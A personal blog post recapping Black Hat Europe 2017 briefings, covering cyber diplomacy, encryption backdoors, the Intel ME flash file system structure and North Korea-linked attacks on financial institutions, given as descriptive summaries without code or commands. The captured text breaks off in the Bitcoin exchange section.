<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Feeback of Black Hat Europe 2017 - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Feedback on the Black Hat Europe 2017."><meta property="og:title" content="Feeback of Black Hat Europe 2017"><meta property="og:description" content="Feedback on the Black Hat Europe 2017."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/bheu2017/"><meta property="og:image" content="/maki.bzh/bheu2017/featured-image.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2017-10-03T21:57:40+08:00"><meta property="article:modified_time" content="2017-10-03T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/maki.bzh/bheu2017/featured-image.png"><meta name=twitter:title content="Feeback of Black Hat Europe 2017"><meta name=twitter:description content="Feedback on the Black Hat Europe 2017."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/bheu2017/><link rel=next href=maki.bzh/feedbackecsc2018/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Feeback of Black Hat Europe 2017","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/bheu2017\/"},"image":[{"@type":"ImageObject","url":"\/maki.bzh\/bheu2017\/featured-image.png","width":533,"height":266}],"genre":"posts","keywords":"bheu, friends, intel me, cti, feedback, maki life, goodies","wordcount":5457,"url":"maki.bzh\/bheu2017\/","datePublished":"2017-10-03T21:57:40+08:00","dateModified":"2017-10-03T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":"Feedback on the Black Hat Europe 2017."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Feeback of Black Hat Europe 2017</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://www.maki.bzh title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Maki</a></span>&nbsp;<span class=post-category>included in <a href=maki.bzh/categories/posts/><i class="far fa-folder fa-fw" aria-hidden=true></i>Posts</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2017-10-03>2017-10-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;5457 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;26 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/maki.bzh/bheu2017/featured-image.png data-srcset="/maki.bzh/bheu2017/featured-image.png, /maki.bzh/bheu2017/featured-image.png 1.5x, /maki.bzh/bheu2017/featured-image.png 2x" data-sizes=auto alt=/maki.bzh/bheu2017/featured-image.png title="Feedback on the Black Hat Europe 2017."></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#day-1>Day 1</a><ul><li><a href=#diplomacy-and-combating-evolving-international-cyber-threats>Diplomacy and Combating Evolving International Cyber Threats</a><ul><li><a href=#sources-document>Sources document</a></li></ul></li><li><a href=#by-design-backdooring-of-encryption-system---can-we-trust-foreign-encryption-algorithms>By-design Backdooring of Encryption System - Can we trust Foreign Encryption Algorithms</a><ul><li><a href=#sources-documents>Sources documents</a></li></ul></li><li><a href=#intel-me-flash-file-system-explained>Intel ME: Flash File System Explained</a><ul><li><a href=#sources-documents-1>Sources documents</a></li></ul></li><li><a href=#nation-state-moneymules-hunting-season---apt-attacks-targeting-financial-institutions>Nation-State Moneymule’s Hunting Season - APT Attacks Targeting Financial Institutions</a></li><li><a href=#korea-major-bank-attack-by-bluenoroff>Korea Major Bank Attack By Bluenoroff</a></li><li><a href=#atm-operator-company-break-aka-vanxatm>ATM Operator Company Break aka VANXATM</a></li><li><a href=#bitcoin-exchanges-hacked>Bitcoin Exchanges Hacked</a><ul><li><a href=#sources-documents-2>Sources documents</a></li></ul></li><li><a href=#how-to-hack-a-turned-off-computer-or-running-unsigned-code-in-intel-management-engine>How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine</a><ul><li><a href=#sources-documents-3>Sources documents</a></li></ul></li><li><a href=#goodies-hunting-part-1>Goodies hunting part 1</a></li></ul></li><li><a href=#day-2>Day 2</a><ul><li><a href=#red-team-techniques-for-evading-bypassing-and-disabling-ms-advanced-threat-protection-and-advanced-threat-analytics>Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics</a><ul><li><a href=#source-documents>Source documents</a></li></ul></li><li><a href=#breaking-out-hsts-and-hpkp-on-firefox-ieedge-and-possibly-chrome>Breaking Out HSTS (and HPKP) on Firefox, IE/Edge and (Possibly) Chrome</a><ul><li><a href=#firefox>Firefox</a></li><li><a href=#chrome>Chrome</a></li><li><a href=#internet-exploreredge>Internet Explorer/EDGE</a></li><li><a href=#source-documents-1>Source documents</a></li></ul></li><li><a href=#key-reinstallation-attacks-breaking-the-wpa2-protocol>Key Reinstallation Attacks: Breaking the WPA2 Protocol</a><ul><li><a href=#source-documents-2>Source documents</a></li></ul></li><li><a href=#a-universal-controller-to-take-over-a-z-wave-network>A Universal Controller to Take Over a Z-Wave Network</a><ul><li><a href=#source-documents-3>Source documents</a></li></ul></li><li><a href=#goodies-hunting-part-2>Goodies hunting part 2</a></li></ul></li><li><a href=#others-briefing>Others briefing</a></li><li><a href=#arsenal>Arsenal</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><h2 id=introduction>Introduction</h2><p>First of all, thanks, Black Hat to win places for a student! I filled the annual survey and that happens, it’s crazy! Then, me and 3 my friends (see below) went to London!</p><ul><li><a href=https://twitter.com/GregoireMolveau target=_blank rel="noopener noreffer">@GregoireMolveau</a></li><li><a href=https://twitter.com/razaborg target=_blank rel="noopener noreffer">@razaborg</a></li><li><a href=https://twitter.com/L4rg0_W1nch target=_blank rel="noopener noreffer">@L4rg0_W1nch</a></li></ul><p>All briefing was interesting, but the most impressive one was on Intel ME from <strong>Mark Ermolov</strong>, <strong>Maxim Goryachy</strong> and <strong>Dimitry SKLYAROV</strong></p><p>I’ll present this article by day and briefing. At the end of each briefing, I’ll add a personal point of view. So, let’s start! :)</p><h2 id=day-1>Day 1</h2><h3 id=diplomacy-and-combating-evolving-international-cyber-threats>Diplomacy and Combating Evolving International Cyber Threats</h3><hr><blockquote><p>Chris Painter - State department’s top cyber diplomat</p></blockquote><p><em>Chris Painter</em> talked about the history of the cyber in his country, and his own history. The presentation highlights something interesting, according to <em>Chris Painter</em>, <strong>policy threats</strong> are more often dangerous than <strong>technical threats</strong>.</p><p>The world is more and more connected, and everything is connected to the Internet. It’s the main reason why <strong>Wannacry</strong> and <strong>NotPetya</strong> did so much damage in UK (and obviously in other countries). Also, it’s very difficult, even impossible, to assign an attack to a group or state/government. At last, a government does not disclose all information about an attack.</p><p><em>Chris Painter</em> told about worldwide cyber norms during peacetime (1) and wartime to harmonize instructions. Laws processes are too slow, so if you don’t respect norms, there are no sanctions yet…</p><p>Another sensitive point is terrorism. <em>Chris Painter</em> said that we have to monitor people to monitor terrorism because they use the internet to communicate with each other, not attacks.</p><p>Finally, it’s hard to ask a physical and/or military response to a cyber attack if there is not at least one death.</p><p><strong>From a personal point of view</strong>, it was interesting to see how the UK manages cyber attacks and what is planned for the future.</p><h4 id=sources-document>Sources document</h4><ol><li>Fergus Hanson, <em>Norms of Cyber War in Peacetime</em>, Sunday, November 15, 2015. <a href=https://www.lawfareblog.com/norms-cyber-war-peacetime target=_blank rel="noopener noreffer">https://www.lawfareblog.com/norms-cyber-war-peacetime</a></li><li>Mei Gechlik, <em>Appropriate Norms of State Behavior in Cyberspace: Governance in China and Opportunities for US Businesses</em>, Aegis Series Paper No. 1706. <a href=https://www.hoover.org/sites/default/files/research/docs/gechlik_webreadypdf.pdf target=_blank rel="noopener noreffer">https://www.hoover.org/sites/default/files/research/docs/gechlik_webreadypdf.pdf</a></li><li>Wikipedia, <em>Colossus computer</em>. <a href=https://en.wikipedia.org/wiki/Colossus_computer target=_blank rel="noopener noreffer">https://en.wikipedia.org/wiki/Colossus_computer</a></li></ol><h3 id=by-design-backdooring-of-encryption-system---can-we-trust-foreign-encryption-algorithms>By-design Backdooring of Encryption System - Can we trust Foreign Encryption Algorithms</h3><hr><blockquote><p>Arnaud BANNIER & Eric FILIOL (speaker) from ESIEA</p></blockquote><p>Few countries (French, Germany, thee UK and so on) are asking for encryption backdoor law (2⁄3) in IoT. Since World War 2, there is a government (G-20 countries now) control on cryptography.</p><p><em>Eric FILIOL</em> says that there are differences between <strong>trapdoor</strong> and <strong>backdoor</strong>.</p><ul><li><strong>Trapdoor</strong>: Feature of asymmetrical encryption.</li><li><strong>Backdoor</strong>: Unwanted feature for attacker benefits.</li></ul><p>In mathematical backdoors, there is two type of weaknesses.</p><ul><li><strong>Natural</strong>: For example, elliptic curves with specific points.</li><li><strong>Intended</strong>: Intentional misconception.</li></ul><p>Now, the question is: Can we trust cryptographic algorithms from a third-party country?</p><p>There are not many choices in cryptography, for public symmetrical and secure algorithms, we have only AES at this time.</p><p><em>Eric FILIOL</em> advises us to read <strong>Verschlüsselt, Der Fall Hans Bühler</strong>. This book talks about an Iranian guy that proves cryptographic algorithms were backdoored. At this time, algorithms were not public, this man was arrested in 1992.</p><p>The NSA did a new cryptographic algorithm for IoT, but after pressure, from experts and corporate, ISO rejected the standard.</p><p>The researcher <em>Eric FILIOL</em> talked about the BEA-1 algorithm and how is it possible to inject a mathematical backdoor.</p><p>His presentation (1) present all the process, I let you check it :)</p><p><strong>From a personal point of view</strong>, this presentation was a good introduction to backdoors in encryption algorithms. But, honestly, I didn’t understand everything :-)</p><h4 id=sources-documents>Sources documents</h4><ol><li>Arnaud BANNIER & Eric FILIOL, <em>Black Hat presentation</em>, Wednesday, December 6, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Filiol-By-Design-Backdooring-Of-Encryption-System-Can-We-Trust-Foreign-Encryption-Algorithms.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Filiol-By-Design-Backdooring-Of-Encryption-System-Can-We-Trust-Foreign-Encryption-Algorithms.pdf</a></li><li>Kieren MCCARTHY, <em>French, German ministers demand new encryption backdoor law</em>, August 26, 2016. <a href=https://www.theregister.co.uk/2016/08/24/french_german_ministers_call_for_new_encryption_backdoor_law/ target=_blank rel="noopener noreffer">https://www.theregister.co.uk/2016/08/24/french_german_ministers_call_for_new_encryption_backdoor_law/</a></li><li>James VINCENT, <em>UK government renews calls for WhatsApp backdoor after London attack</em>, March 27, 2017. <a href=https://www.theverge.com/2017/3/27/15070744/encryption-whatsapp-backdoor-uk-london-attacks target=_blank rel="noopener noreffer">https://www.theverge.com/2017/3/27/15070744/encryption-whatsapp-backdoor-uk-london-attacks</a></li><li>Cryptographic laws in different countries. <a href=http://www.cryptolaw.org/ target=_blank rel="noopener noreffer">http://www.cryptolaw.org/</a></li></ol><h3 id=intel-me-flash-file-system-explained>Intel ME: Flash File System Explained</h3><hr><blockquote><p>Dimitry SKLYAROV - Positive Technologies</p></blockquote><p><em>Dimitry SKLYAROV</em> starts his presentation by introducing the Intel Management Engine and the hierarchy in a computer.</p><p>Hierarchy of a computer:</p><ol><li>User</li><li>OS Kernel</li><li>Hypervisor</li><li>System Management Mode (SMM)</li><li>Management Engine (ME)</li></ol><p>Top layer (user) has limited permission on the under layer (OS Kernel) and this mecanism works until the fifth layer. On the other hand, the under layer has full access on the top one.
Then, from 1 to 5 -> limited access and from 5 to 1 -> Full access.
To conclude, Intel ME got full access to the machine.</p><p>I let you imagine what happens if malware goes into the ME. The ME is a standalone electronic chip before the CPU, it interacts with all other components.</p><p><em>Dimitry SKLYAROV</em> says that before trying to flash the Intel ME, you have to erase it completely. But, there is a limited number of cycles (between 10 000 and 1 000 000). After this limit, the ME is unusable.</p><p>Intel made design the flash with incremental modification to avoid redundantly erases and distribute erases between block as evenly as possible to preserve the ME.</p><p>After the introduction, <em>Dimitry SKLYAROV</em> talked about <strong>MFS pagination</strong>. Inside the ME, all MFS page has the same size (8192 bytes), starts with the same header (0xAA557887) and there is always an empty page.</p><table><thead><tr><th>Signature</th><th>USN</th><th>nErase</th><th>iNextErase</th><th>firstChunk</th><th>csum</th><th>0x00</th></tr></thead></table><ul><li>Signature: Always 0xAA557887</li><li>USN: Update Sequence Number</li><li>nErase: How many times page has been erased</li><li>iNextErase: Index of next to be erased page</li><li>firstChunk: Index of first chunk (for Data page)</li><li>csum: Checksum</li></ul><p>Each page contains 66 bytes chunks, it’s an addressable and modifiable unit in the page of the MFS. Those chunks contain 2 bytes of checksum at the end (CRC-16).</p><p><em>Dimitry SKLYAROV</em> mentions that reversing CRC-16 allows easy calculation of the chunk index. By the way, <em>indexing</em> is the reason why checksum is different for the same data.</p><p>Just after the header chunk, there is the <strong>system chunk</strong>. As the <em>Dimitry SKLYAROV</em> picture shows below, this chunk is composed of:</p><ul><li>Chunk# 0x1201: Chunk full of zero</li><li>Chunk# 0x1202: Two first bytes at <code>F4 D4</code> followed by a complete chunk full of zero</li><li>Chunk# 0x1203: Two first bytes at <code>A7 B1</code> followed by a complete chunk full of zero</li><li>Chunk# 0x1204: Two first bytes at <code>96 B2</code> followed by a complete chunk full of zero</li><li>&mldr;</li></ul><p><strong>axIdx</strong> is a 16 bits array, entries of this array are the number of chunks + 1 and it is dynamically XORed. The key value depends on the previous value from <strong>axIdx</strong>. You can recover it by reversing CRC-16 function (in fact, it’s a modified algorithm stripped to 14 bits).</p><p>Data pages are easier to understand. After the header page, there is the <strong>aFree</strong> bit. This bit tells if the data chunk contains something or not (<strong>aFree[i] == 0xFF</strong>).</p><p>Each Data chunk is stored once with a sequential number started from the first chunk.</p><p>System chunks are stored accords to the update order, not sequentially. Then, an index from System page is derived from <strong>axIdx</strong> value.</p><p>Now, to extract data, <em>Dimitry SKLYAROV</em> explains that you have to follow this diagram:</p><table><thead><tr><th>Diagram</th></tr></thead><tbody><tr><td>int32 - Volume Signature (0x724F6201)</td></tr><tr><td>int32 - Volume Version ?</td></tr><tr><td>int32 - Total capacity: System area + Data area</td></tr><tr><td>int16 - Number of files records</td></tr><tr><td>int16 - File allocation table</td></tr></tbody></table><p>Low-Level MFS does not support file names. Files are identified by numbers (from 0 to nFiles-1). Let <em>Dimitry SKLYAROV</em> explains his diagram:</p><ol><li>Calculate the index in File Allocation Table: <strong>ind = aFAT[iFile]</strong>. Values 0x0000 for unused and 0xFFFE for erased means that file does not exist and values 0xFFFF means empty file.</li><li><strong>ind</strong> must be between <strong>nFiles</strong> and aFAT length.</li><li>Extract chunk data</li><li>Calculate the next index</li><li>If the new value is between 0 and chunk size MFS, then output first <strong>ind</strong> bytes of data and goes to the end of the process.</li><li>Output all 64 bytes of data and processes to step 2.</li></ol><p>After that, <em>Dimitry SKLYAROV</em> did an MFS template from <strong>fit.exe</strong>.</p><p>Then MFS is composed of:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/me4.png data-srcset="/lib/images/articles/bheu2017/me4.png, /lib/images/articles/bheu2017/me4.png 1.5x, /lib/images/articles/bheu2017/me4.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/me4.png title=/lib/images/articles/bheu2017/me4.png></p><p><em>Dimitry SKLYAROV</em> attentions was on <em>Slot 6</em>, containing the <strong>intel.cfg</strong> file. This file is necessary for ME deployment at the first run. Here is the structure:</p><table><thead><tr><th>File #</th><th>Description</th></tr></thead><tbody><tr><td>2,3</td><td>AR (Anti-Replay) table</td></tr><tr><td>4</td><td>Used for migration after SVN (Secure Version Number) upgrade</td></tr><tr><td>5</td><td>File System Quota storage (related to User info metadata extension for <code>vfs</code> module</td></tr><tr><td>6</td><td><code>/intel.cfg</code> file (default state of FS configured by Intel). SHA256 of <code>intel.cfg</code> is stored in System Info manifest extension</td></tr><tr><td>7</td><td><code>fitc.cfg</code> file (vendor-specific FS configuration). Can be created by platform vendor using Intel&rsquo;s Flash Image Tool (fit.exe)</td></tr><tr><td>8</td><td><code>/home/</code> directory (starting directory for ME files stored in MFS)</td></tr></tbody></table><p>Below a partial dump of the <strong>intel.cfg</strong>:</p><table><thead><tr><th>Diagram</th></tr></thead><tbody><tr><td>int32 - Number of records</td></tr><tr><td>File Name (char name[12])</td></tr><tr><td>int16 - unused, always 0</td></tr><tr><td>int16 - Access mode</td></tr><tr><td>int16 - Deploy options</td></tr><tr><td>int16 - File data length</td></tr><tr><td>int16 - Owned user ID (UID)</td></tr><tr><td>int16 - Owner group ID (GID)</td></tr><tr><td>int32 - File data offset</td></tr><tr><td>int8 - File data</td></tr></tbody></table><p>Letters in <strong>mode</strong> and <strong>opt</strong> field means:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/mode_and_opt_field_means.png data-srcset="/lib/images/articles/bheu2017/mode_and_opt_field_means.png, /lib/images/articles/bheu2017/mode_and_opt_field_means.png 1.5x, /lib/images/articles/bheu2017/mode_and_opt_field_means.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/mode_and_opt_field_means.png title=/lib/images/articles/bheu2017/mode_and_opt_field_means.png></p><p>An MFS directory is just an array of records describing containing files. MFS file #8 always represents the <strong>/home/</strong> directory. Here is the structure:</p><table><thead><tr><th>Struct - T_MFS_Folder_Record</th></tr></thead><tbody><tr><td>int32 - filenoi (FS, salt, iFile)</td></tr><tr><td>int16 - mode (Access mode)</td></tr><tr><td>int16 - uid (Owner User ID)</td></tr><tr><td>int16 - gid (Group User ID)</td></tr><tr><td>int16 - salt (Another salt)</td></tr><tr><td>name[12] - File name</td></tr></tbody></table><p>And a dump of the password manager located in the <strong>home/policy/pwdmgr/</strong> directory:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/homepolicypwdmgr.png data-srcset="/lib/images/articles/bheu2017/homepolicypwdmgr.png, /lib/images/articles/bheu2017/homepolicypwdmgr.png 1.5x, /lib/images/articles/bheu2017/homepolicypwdmgr.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/homepolicypwdmgr.png title=/lib/images/articles/bheu2017/homepolicypwdmgr.png></p><p>Meaning of <strong>fileno</strong>:</p><table><thead><tr><th>Bits</th><th>Description of <code>fileno</code> fields</th></tr></thead><tbody><tr><td>11..0</td><td>iFile (0..4095)</td></tr><tr><td>27..12</td><td>16 bits of salt</td></tr><tr><td>31..28</td><td>FileSystem ID (always 1)</td></tr></tbody></table><p>and <strong>mode</strong>:</p><table><thead><tr><th>Bits</th><th>Description of <code>mode</code> fields</th></tr></thead><tbody><tr><td>8..0</td><td><code>rwxrwxrwx</code> Unix-like rights</td></tr><tr><td>9</td><td><code>I</code> Enable integrity protection</td></tr><tr><td>10</td><td><code>E</code> Enable encryption</td></tr><tr><td>11</td><td><code>A</code> Enable anti-replay protection</td></tr><tr><td>13</td><td><code>N</code> Use non-Intel keys</td></tr><tr><td>15..14</td><td><code>d</code> Record type (0: file, 1: directory)</td></tr></tbody></table><p>If bit 9 (for <em>integrity</em>) is set in the <strong>mode</strong> field, raw file contains additional security blob. It is added to the <strong>Anti-replay</strong> tables (iFile == 2,3) and <strong>/home/</strong> directory (iFile == 8).</p><p>The final part of the <em>Dimitry SKLYAROV</em> presentation was about <strong>File system security keys</strong>. There are up to 10 security keys involved in protecting the MFS content.</p><p>Replay-Protected Monotonic Counter is a feature of the SPI flash. If this feature is unavailable, then the ME implements its own counter. There are two keys to handle RPMC, <strong>RPMC HMAC keys</strong>.</p><p>Two more keys are used to protect Integrity and Confidentiality. Moreover, there are two sets of keys: <strong>Intel keys</strong> and <strong>Non-intel keys</strong> (motherboard manufacturer keys).</p><p>Surprisingly enough, Intel keys are used in rare modules (sigma, ptt, dal_ivm, mca).</p><p>It’s possible to derive keys, and Secure Key Storage is allowed for ROM, bup and crypto modules.</p><p>Knowing <strong>GEN</strong> secret for non-intel keys (via JTAG) allows to read/write on the MFS. If we can execute code into <strong>bup</strong> module, then it is possible to recover intel keys.</p><p><strong>From a personal point of view</strong>, I loved this presentation! I’m very interested in Intel ME and how it works. After the briefing, a lot of things were much clearer to me.</p><h4 id=sources-documents-1>Sources documents</h4><ol><li>Dimitry SKLYAROV, <em>Flash File System Explained</em>, Wednesday, December 6, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained-wp.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained-wp.pdf</a></li><li>Dimitry SKLYAROV, <em>Black Hat Presentation</em>, Wednesday, December 6, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained.pdf</a></li><li>Intel Reference Guide, <em>Intel AMT Release 2.0/2.1⁄2.2 Architecture</em>. <a href="https://software.intel.com/sites/manageability/AMT_Implementation_and_Reference_Guide/default.htm?turl=WordDocuments/intelamtrelease202122architecture.htm" target=_blank rel="noopener noreffer">https://software.intel.com/sites/manageability/AMT_Implementation_and_Reference_Guide/default.htm?turl=WordDocuments/intelamtrelease202122architecture.htm</a></li><li>Xiaoyu Ruan, <em>Platform Embedded Security Technology Revealed</em>. <a href=https://link.springer.com/content/pdf/10.1007%2F978-1-4302-6572-6.pdf target=_blank rel="noopener noreffer">https://link.springer.com/content/pdf/10.1007%2F978-1-4302-6572-6.pdf</a></li><li>Igor Skochinsky, <em>Intel ME Secrets</em>. <a href=https://recon.cx/2014/slides/Recon%202014%20Skochinsky.pdf target=_blank rel="noopener noreffer">https://recon.cx/2014/slides/Recon%202014%20Skochinsky.pdf</a></li><li>Positive Technologies, <em>Intel ME: The Way of the Static Analysis</em>. <a href=https://www.troopers.de/downloads/troopers17/TR17_ME11_Static.pdf target=_blank rel="noopener noreffer">https://www.troopers.de/downloads/troopers17/TR17_ME11_Static.pdf</a></li><li>Positive Technologies, <em>[Github] Intel ME 11.x Firmware Images Unpacker</em>. <a href=https://github.com/ptresearch/unME11 target=_blank rel="noopener noreffer">https://github.com/ptresearch/unME11</a></li></ol><h3 id=nation-state-moneymules-hunting-season---apt-attacks-targeting-financial-institutions>Nation-State Moneymule’s Hunting Season - APT Attacks Targeting Financial Institutions</h3><hr><blockquote><p>Min-Chang Jang (speaker), Chi-en Shen (speaker) & Kyoung-Ju Kwak from KFSI & Team T5</p></blockquote><p>They started to introduce different groups and made a timeline of different attacks:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/apt1.png data-srcset="/lib/images/articles/bheu2017/apt1.png, /lib/images/articles/bheu2017/apt1.png 1.5x, /lib/images/articles/bheu2017/apt1.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/apt1.png title=/lib/images/articles/bheu2017/apt1.png></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/apt2.png data-srcset="/lib/images/articles/bheu2017/apt2.png, /lib/images/articles/bheu2017/apt2.png 1.5x, /lib/images/articles/bheu2017/apt2.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/apt2.png title=/lib/images/articles/bheu2017/apt2.png></p><h3 id=korea-major-bank-attack-by-bluenoroff>Korea Major Bank Attack By Bluenoroff</h3><p>In March 2017, the Korea major bank has been attacked. Targets were employees in charge of the SWIFT system. <strong>Bluenoroff</strong> found a 0day in a file sharing function in VDI Program (4).</p><p><em>No severe damage and only 2 PC infected</em></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/apt3.png data-srcset="/lib/images/articles/bheu2017/apt3.png, /lib/images/articles/bheu2017/apt3.png 1.5x, /lib/images/articles/bheu2017/apt3.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/apt3.png title=/lib/images/articles/bheu2017/apt3.png></p><p>Malware used is in <strong>Manuscrypt</strong> family.</p><ul><li>Research for SWIFT network.</li><li>Activate NamedPipe of a specific process.</li><li>Look for desired data and send them to C&C server.</li></ul><p>IP was hidden in a plain registry key. Data sent to the C2 were encoded.</p><p>And here is how analyst were able to decode the data:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/apt4.png data-srcset="/lib/images/articles/bheu2017/apt4.png, /lib/images/articles/bheu2017/apt4.png 1.5x, /lib/images/articles/bheu2017/apt4.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/apt4.png title=/lib/images/articles/bheu2017/apt4.png></p><h3 id=atm-operator-company-break-aka-vanxatm>ATM Operator Company Break aka VANXATM</h3><p>The operation started from Feb 2015 and leakage in March 2017. The target is ATM Operator Company (manage more than 2000 ATM).</p><p>Andareil group used a 0day in AV and misconfiguration/mismanagement between ATM machines and ATM update server.</p><p>230 000 credit card information leaked.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/apt5.png data-srcset="/lib/images/articles/bheu2017/apt5.png, /lib/images/articles/bheu2017/apt5.png 1.5x, /lib/images/articles/bheu2017/apt5.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/apt5.png title=/lib/images/articles/bheu2017/apt5.png></p><p>Malware <strong>fs.exe</strong>:</p><ul><li>Scan AV server’s service port</li><li>Connect to server</li><li>Send file</li><li>Run file</li><li>Look for Transaction date/time, account number issuers, request amount and balance.</li></ul><p>For the VANXATM case, Andariel group targeted only 64 ATM, because they have plain credit card information on a FTP.</p><h3 id=bitcoin-exchanges-hacked>Bitcoin Exchanges Hacked</h3><p>Four Bitcoin exchanges were attacked. Attacker impersonates the public institutes for phishing and they used nine email accounts for attack (4 out 9 were stolen).</p><p>Mobile malware to bypass SMS authentication.</p><p>Sample hash: 